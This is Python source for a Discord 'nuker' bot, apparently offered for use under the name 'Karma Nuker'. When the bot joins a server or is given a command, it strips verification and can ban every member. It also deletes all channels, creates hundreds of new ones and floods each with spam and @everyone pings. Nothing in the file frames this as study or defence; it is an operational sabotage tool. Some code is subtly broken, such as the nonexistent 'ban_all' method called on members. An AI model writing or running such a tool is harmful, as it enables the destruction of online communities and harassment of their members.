from colorama.initialise import init
import discord
from discord.ext import commands
from colorama import Fore
import json
import time
import json

with open("config.json", "r") as f:
    f = json.load(f)

nuke_on_join = f.get("nuke_on_join")
guild_name = f.get("guild_name")
ban_all = f.get("ban")
channel_name = f.get("channel_name")
channel_name2 = f.get("channel_name2")
text = f.get("text")
text2 = f.get("text2")
reason = f.get("audit_log_reason")
token = f.get("bot-token")

init()

intents = discord.Intents.all()
client = commands.Bot(command_prefix="$", intents=intents)
client.remove_command('help')


class COLOR:
    r = Fore.RED
    g = Fore.GREEN
    lb = Fore.LIGHTBLUE_EX
    m = Fore.MAGENTA
    lc = Fore.LIGHTCYAN_EX
    c = Fore.CYAN
    y = Fore.LIGHTYELLOW_EX
    b = Fore.BLUE
    w = Fore.RESET


@client.event
async def on_ready():
    print(f'''
      
{COLOR.m}        ##    ##    ###    ########  ##     ##    ###       ##    ## ##     ## ##    ## ######## ########  
{COLOR.b}        ##   ##    ## ##   ##     ## ###   ###   ## ##      ###   ## ##     ## ##   ##  ##       ##     ## 
{COLOR.m}        ##  ##    ##   ##  ##     ## #### ####  ##   ##     ####  ## ##     ## ##  ##   ##       ##     ## 
{COLOR.b}        #####    ##     ## ########  ## ### ## ##     ##    ## ## ## ##     ## #####    ######   ########  
{COLOR.m}        ##  ##   ######### ##   ##   ##     ## #########    ##  #### ##     ## ##  ##   ##       ##   ##   
{COLOR.b}        ##   ##  ##     ## ##    ##  ##     ## ##     ##    ##   ### ##     ## ##   ##  ##       ##    ## 
{COLOR.m}        ##    ## ##     ## ##     ## ##     ## ##     ##    ##    ##  #######  ##    ## ######## ##     ##            
                                              

{COLOR.b}                                                Coded with love by @opsec
{COLOR.m}                                                GitHub.com/opsecs
{COLOR.m}                                                Prefix: {client.command_prefix}    
{COLOR.b}                                                Bot: {client.user}  
 ''')                                                                                                                    
    time.sleep(0.3)                                                                                                   
    print(f'''                                                                                                         
       {COLOR.m}SETTINGS:
       {COLOR.b}[NUKE ON JOIN] - {COLOR.m}{nuke_on_join}
       {COLOR.b}[REASON] - {COLOR.m}{reason}
       {COLOR.b}[GUILD NAME] - {COLOR.m}{guild_name}
       {COLOR.b}[BAN ALL] - {COLOR.m}{ban_all}
       {COLOR.b}[CHANNEL NAME] - {COLOR.m}{channel_name}
       {COLOR.b}[SECOND CHANNEL NAME] - {COLOR.m}{channel_name2}    
       {COLOR.b}[TEXT] - {COLOR.m}{text}
    ''')
    input1 = input(f"       {COLOR.b}Press{COLOR.m} enter {Fore.RESET}{COLOR.b}to{COLOR.m} continue: ")
    if input1 == "":
        print(f"        {COLOR.g}Succes! Write {client.command_prefix}help in server to display help commands in this console. {COLOR.w}")
    else:
        pass



BLUE = "\033[94m"
LIGHT_MAGENTA = "\033[95m"
RESET = "\033[0m"

@client.command()
async def help(ctx):
    await ctx.message.delete()
    
    print("\nCommands:\n"
    f"{BLUE}{client.command_prefix}nuke{RESET}{LIGHT_MAGENTA} - nukes the server{RESET}\n"
    f"{LIGHT_MAGENTA}{client.command_prefix}spam [channel]{RESET}{BLUE} - Spams @everyone ping 100 times{RESET}\n"
    f"{BLUE}{client.command_prefix}ban_all{RESET}{LIGHT_MAGENTA} - Bans everyone in the server{RESET}\n"
    f"{LIGHT_MAGENTA}{client.command_prefix}delete{RESET}{BLUE} - Deletes every channel{RESET}\n"
    f"{BLUE}{client.command_prefix}members{RESET}{LIGHT_MAGENTA} - Displays members count{RESET}\n")

@client.event
async def on_guild_join(guild):
    if nuke_on_join == "true" or nuke_on_join == "true":
        try:
            await guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
        except:
            pass
        if guild.name == guild_name:
            print(f"{COLOR.g}[!] Successfully Edited The Guild Name To {guild_name}")
        if discord.VerificationLevel.none:
            print(f"{COLOR.g}[!] Edited Verification Level To NONE\n")
        if ban_all == "yes" or ban_all == "Yes":
            for members in guild.members:
                try:
                        await members.ban_all(reason=reason)
                        print(f"{COLOR.r}[!] Banned {members}")
                except:
                    pass
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{COLOR.m}[!] Succesfully Deleted channel #{channel}")
            except:
                pass
        for i in range(200):
            try:
                await guild.create_text_channel(name=channel_name, reason=reason)
            except:
                print(f"{COLOR.r}[!] Could not create channel.{Fore.RESET}")
            if channel_name2 != '':
                try:
                    await guild.create_text_channel(name=channel_name2, reason=reason)
                except:
                    print(f"{COLOR.r}[!] Could not create second channel.{Fore.RESET}")


        



@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
    except:
            pass
    if ctx.guild.name == guild_name:
            print(f"{COLOR.g}[!] Successfully Edited Guild Name To {guild_name}")
    if discord.VerificationLevel.none:
            print(f"{COLOR.g}[!] Edited Verification Level to NONE\n")
    if ban_all == "true" or ban_all == "true":
            for members in ctx.guild.members:
                try:
                        await members.ban(reason=reason)
                        print(f"{COLOR.r}[!] Banned {members}")
                except:
                    pass
    for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"{COLOR.m}[!] Deleted channel #{channel}")
            except:
                pass
    for i in range(200):
            try:
                await ctx.guild.create_text_channel(name=channel_name, reason=reason)
            except:
                print(f"{COLOR.r}[!] Could not create channel.{Fore.RESET}")
            if channel_name2 != '':
                try:
                    await ctx.guild.create_text_channel(name=channel_name2, reason=reason)
                except:
                    print(f"{COLOR.r}[!] Could not create second channel.{Fore.RESET}")
                         
@client.event
async def on_guild_channel_create(channel):
    for i in range(100):
        await channel.send(text)

@client.command()
async def spam(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    for i in range(100):
        await channel.send("@everyone https://guns.lol/opsec")


@client.command(aliases=['ba'])
async def ban_all(ctx):
    await ctx.message.delete()
    for members in ctx.guild.members:
            try:
                    await members.ban(reason=reason)
                    print(f"{COLOR.r}[!] Banned {members}")
            except:
                print(f"{COLOR.r}[!] Couldn't ban {members} {Fore.RESET}")
                pass


@client.command(aliases=['clear_channels'])
async def delete(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{COLOR.g}[!] Sucessfully Deleted channel #{channel}")
        except:
            pass


@client.command()
async def members(ctx):
    await ctx.message.delete()
    await ctx.send(f"members amount: {ctx.guild.member_count}")
client.run(token)
